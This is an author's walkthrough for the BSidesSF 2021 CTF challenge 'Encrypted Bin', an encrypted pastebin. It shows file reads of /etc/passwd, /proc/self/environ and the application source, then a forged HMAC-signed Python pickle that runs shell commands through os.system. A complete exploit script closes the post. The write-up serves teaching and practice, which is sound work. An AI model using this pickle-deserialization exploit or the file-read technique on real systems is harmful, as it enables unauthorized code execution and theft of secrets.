---
layout: post
title: "BSidesSF 2021 CTF: Encrypted Bin (Author Writeup)"
category: Security
date: 2021-03-08
tags:
  - CTF
  - BSidesSF
date: 2021-03-08
---

I was the author for the BSidesSF 2021 CTF Challenge "Encrypted Bin", which is
an encrypted pastebin service.  The description from the scoreboard:

> I've always wanted to build an encrypted pastebin service.
> Hope I've done it correctly. (Look in `/home/flag/` for the flag.)

I thought I'd do a walk through of how I expected players to solve the
challenge, so I'll write this as if I'm playing the challenge.

Visiting the web service, we find an upload page for text and not much else.
When we perform an upload, we see that we're redirected to a page to view the
encrypted upload:

```
https://encryptbin-12f88e53.challenges.bsidessf.net/3440de91-bd99-418d-8742-61cfc8d0869c/jbWfZBIJMu75b7g6JL4obQ==!gAN9cQAoWAMAAABrZXlxAUMQoqUau03ia_Z8gIg38K6dH3ECWAIAAABpdnEDQwhQoP3W-UvIM3EEdS4=
```

If we look at the requests made in our browser, we notice that the contents of
the paste are loaded by a [Fetch
API](https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API) request to the
server at `/load`, with an example request like:

```
https://encryptbin-12f88e53.challenges.bsidessf.net/load?file=3440de91-bd99-418d-8742-61cfc8d0869c&key=jbWfZBIJMu75b7g6JL4obQ%3D%3D!gAN9cQAoWAMAAABrZXlxAUMQoqUau03ia_Z8gIg38K6dH3ECWAIAAABpdnEDQwhQoP3W-UvIM3EEdS4%3D
```

We note the UUID as the file parameter and the key parameter separately.  If we
upload a few test files, we notice the entire file UUID changes each time, but
not all parts of the key parameter are changing, suggesting some structure to
the data:

```
jbWfZBIJMu75b7g6JL4obQ==!gAN9cQAoWAMAAABrZXlxAUMQoqUau03ia_Z8gIg38K6dH3ECWAIAAABpdnEDQwhQoP3W-UvIM3EEdS4=
4JhMLDj2_jqKB3Mga48sjw==!gAN9cQAoWAMAAABrZXlxAUMQyjuJPDmWctC2GqttcFotC3ECWAIAAABpdnEDQwiBbMqafv3GmXEEdS4=
3FPPCBGVktV6tYGNxQESpw==!gAN9cQAoWAMAAABrZXlxAUMQW77ObBYrougerdcyT8rDAnECWAIAAABpdnEDQwhdBIG6VnnufHEEdS4=
gSXVhGP0xqqZlY8LP4m10A==!gAN9cQAoWAMAAABrZXlxAUMQvQTrZZyOMy-dJnELRrR5cHECWAIAAABpdnEDQwiB1pRKE_s24XEEdS4=
O7ttlljfsYYQ1giJkh7r2w==!gAN9cQAoWAMAAABrZXlxAUMQTMN0Nv6FADGx4Db8a47O8nECWAIAAABpdnEDQwhbn4dopviAzHEEdS4=
N_xTGv4gndZemzXtglEzog==!gAN9cQAoWAMAAABrZXlxAUMQmErsXcdIRlSngzdd-VseZXECWAIAAABpdnEDQwgiKmU3EL20QnEEdS4=
```

The single bang (`!`) in the middle is likely a separator, and the data on both
sides appear to be base64-encoded.  (Well, the URL-safe variant of `base64`,
where `-` and `_` are used in addition to `0-9A-Za-z`.) The left side is 16
bytes decoded, so 128 bits -- could be some sort of key or MAC.  It appears to
always be completely random.  The right side, on the other hand, has some parts
that never change.  This suggests some kind of structured data.  If we decode
them, we see the characters "keyq" and "ivq" consistently, suggesting maybe
there's some key/iv data there.

What if we try manipulating the data?  If we tamper with most any byte in the
key parameter, we get the following response:

```
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>403 Forbidden</title>
<h1>Forbidden</h1>
<p>Error deserializing pickled data: Invalid MAC</p>
```

The error here tells us a couple of interesting things.  Firstly, there's a
[MAC](https://en.wikipedia.org/wiki/Message_authentication_code) involved,
telling us the value is signed in some way.
Secondly, many might recognize "pickled data" as referring to the [Python pickle
module](https://docs.python.org/3/library/pickle.html) (and it's the first
search result for the term).  The page even contains a warning:

> Warning The pickle module is not secure. Only unpickle data you trust.
> 
> It is possible to construct malicious pickle data which will execute arbitrary
> code during unpickling. Never unpickle data that could have come from an
> untrusted source, or that could have been tampered with.
> 
> Consider signing data with `hmac` if you need to ensure that it has not been
> tampered with.

The mention of `hmac` sounds similar to what we see in the error message, so it
sounds like we're on the right path.

What if we play with the `file` parameter?  Most things just end up with a 404
error.  If we include `..`, as in a typical directory traversal attack (like
`../../../../../etc/passwd`), we find a different error, suggesting something
different is happening.  Most probably, the file parameter is not just a key in
some database.  If we just try an absolute path like `/etc/passwd`, we get a
bunch of binary data back.  Since the file on disk is plaintext, we're probably
getting the data "decrypted" by the key we provided.  Can we reverse this?

Let's try to figure out how we can decrypt this file.  Let's try unpickling the
data from one of the keys we've retrieved:

```
keyData = pickle.loads(base64.urlsafe_b64decode('gAN9cQAoWAMAAABrZXlxAUMQmErsXcdIRlSngzdd-VseZXECWAIAAABpdnEDQwgiKmU3EL20QnEEdS4='))
print(keyData)
{'key': b'\x98J\xec]\xc7HFT\xa7\x837]\xf9[\x1ee', 'iv': b'"*e7\x10\xbd\xb4B'}
```

We know from the home page that this uses AES-128, and its implemented in
Python3.  There's a couple of Python Crypto libraries (sorry!) but
`pycryptodome` is used here.

We can decrypt data we receive back using just a few lines of Python:

```
from Crypto.Cipher import AES

def decrypt_data(data, key, iv):
    cip = AES.new(key, AES.MODE_CTR, nonce=iv)
    return cip.decrypt(data)
```

Given this, we're able to read arbitrary files from the server.  If you've
checked the HTML source of the app, you'll have seen `/home/ctf/main.py`
mentioned as the source.  If you retrieve that, you'll have the full source of
the application.  I won't reproduce it in full here, but will grab some relevant
sections:

```python
def unpack_key(cfg, data):
    """Retrieve key and iv."""
    mac, d = data.encode('utf-8').split(MAC_SEP)
    mac = base64.urlsafe_b64decode(mac)
    d = base64.urlsafe_b64decode(d)
    expected = hmac.new(
            cfg['AUTH_KEY'].encode('utf-8'),
            msg=d,
            digestmod=hashlib.sha256).digest()[:16]
    if not hmac.compare_digest(mac, expected):
        app.logger.warn('Invalid MAC: ' + mac.hex() + ' ' + expected.hex())
        raise ValueError('Error deserializing pickled data: Invalid MAC')
    keyd = pickle.loads(d)
    return keyd['key'], keyd['iv']
```

You'll also want to pull the related import `/home/ctf/config.py` (loaded at the
top of `main.py`):

```python
import os

TEMPLATES_AUTO_RELOAD = True

# App specific configs
BASE_DIR = "/tmp/ebin"
AUTH_KEY = os.getenv("AUTH_KEY", "--auth-key--")
FLAG_PATH = "/home/flag/flag.txt"
```

We can try our current technique to read the flag file from
`/home/flag/flag.txt`, but that returns a 403 error.

We notice that the authentication key for the HMAC is configured here, but it
could be taken from the environment as well.  We could try doing something with
this key, but instead, I'd rather just dump the environment.  If you're not
aware, you can access the environment variables for a running process on Linux
by reading `/proc/self/environ`.  Each `NAME=VALUE` pair is null-terminated.
Retrieving this in the same manner as the source, we get the following value for
the `AUTH_KEY`:

```
AUTH_KEY=good_work_but_need_a_shell
```

Well, this suggests we need to execute code instead of just reading the flag
from the file.

At this point, we can use the `AUTH_KEY` and the code in `pack_key` to try to
construct our own valid key.  Initially, I just set up a key and iv of my own
choosing to avoid the same "Invalid MAC" error.  Just plugging in the `AUTH_KEY`
value and `key` and `iv` of my choice to `pack_key` worked fine.  But all this
allows is choosing my own encryption key -- not super useful at this point.

If you recall, there was a bit of a warning regarding the use of `pickle` and
the ability to execute arbitrary code during pickling.  A Python class to
execute a shell command is as simple as this:

```python
class Exp:

    def __init__(self, cmd):
        self.cmd = cmd

    def __reduce__(self):
        return os.system, (self.cmd, )
```

While I could send a reverse shell, I decided to use this to build a script
that would just return output via output redirection to a file, then using the
arbitrary file read.  Listing `/home/flag`, we see that `flag.txt` is only
readable by the `flag` user, but there's also a program called `getflag` that is
`setuid()` to the user `flag`.

```
-r-------- 1 flag ctf       22 Feb 27 23:14 flag.txt
-r-s--x--- 1 flag ctf  2061426 Feb 27 23:14 getflag
```

By altering our exploit to run `/home/flag/getflag` and getting the output,
we're able to get the contents of the flag file.  Putting it all together gives
the following solution script.  Hope you found this challenge interesting or
educational!

```python
import pickle
import requests
import sys
from Crypto.Cipher import AES
import os.path
import base64
import hmac
import hashlib


def main(target):
    src_path = get_source_path(target)
    print('Source path:', src_path)
    usable_key = get_key_data(target)
    key, iv = extract_key_nonce(usable_key)
    file_src = retrieve_path(target, src_path, usable_key)
    print(file_src.decode('utf-8'))
    config_src = retrieve_path(
            target, src_path.replace('main.py', 'config.py'), usable_key)
    print(config_src.decode('utf-8'))
    environ_src = retrieve_path(
            target, '/proc/self/environ', usable_key)
    auth_key = extract_auth_key(environ_src)
    print('Auth Key: "%s"' % auth_key.decode('utf-8'))
    exploit = build_exploit(auth_key, 'ls -al /home/flag > /tmp/matirflag')
    retrieve_path(target, '/etc/passwd', exploit)  # Needed to get code exec
    print(retrieve_path(target, '/tmp/matirflag', usable_key).decode('utf-8'))
    exploit = build_exploit(auth_key, '/home/flag/getflag > /tmp/matirflag')
    retrieve_path(target, '/etc/passwd', exploit)  # Needed to get code exec
    flag = retrieve_path(
            target, '/tmp/matirflag', usable_key)
    print('Flag: ', flag.decode('utf-8'))


def get_source_path(target):
    r = requests.get(target)
    src_line = [a for a in r.text.split('\n') if '<!-- Source' in a][0]
    return src_line.split(': ')[1].split(' ')[0]


def get_key_data(target):
    data = {'paste': 'foobarbaz'}
    r = requests.post(target + '/upload', data=data)
    resp = r.json()
    return resp['key']


def extract_key_nonce(key_data):
    sig, e_key = key_data.split('!')
    key_d = base64.urlsafe_b64decode(e_key)
    key_s = pickle.loads(key_d)
    return key_s['key'], key_s['iv']


def retrieve_path(target, src_path, key_data):
    data = {
            'file': src_path,
            'key': key_data,
            }
    r = requests.get(target + '/load', data)
    if r.status_code != 200:
        print('Error:', r.status_code)
        return ''
    key, iv = extract_key_nonce(key_data)
    return decrypt_data(r.content, key, iv)


def extract_auth_key(environ):
    pairs = environ.split(b'\x00')
    print((b'\n'.join(pairs)).decode('utf-8'))
    for p in pairs:
        k, v = p.split(b'=', 1)
        if k == b'AUTH_KEY':
            return v


def decrypt_data(data, key, iv):
    cip = AES.new(key, AES.MODE_CTR, nonce=iv)
    return cip.decrypt(data)


def build_exploit(auth_key, cmd):
    exp = Exp(cmd)
    exp_d = pickle.dumps(exp)
    mac = hmac.new(auth_key, msg=exp_d, digestmod=hashlib.sha256).digest()[:16]
    return (
            base64.urlsafe_b64encode(mac) + b"!" +
            base64.urlsafe_b64encode(exp_d)).decode('utf-8')


class Exp:

    def __init__(self, cmd):
        self.cmd = cmd

    def __reduce__(self):
        return os.system, (self.cmd, )


if __name__ == '__main__':
    main(sys.argv[1])
```
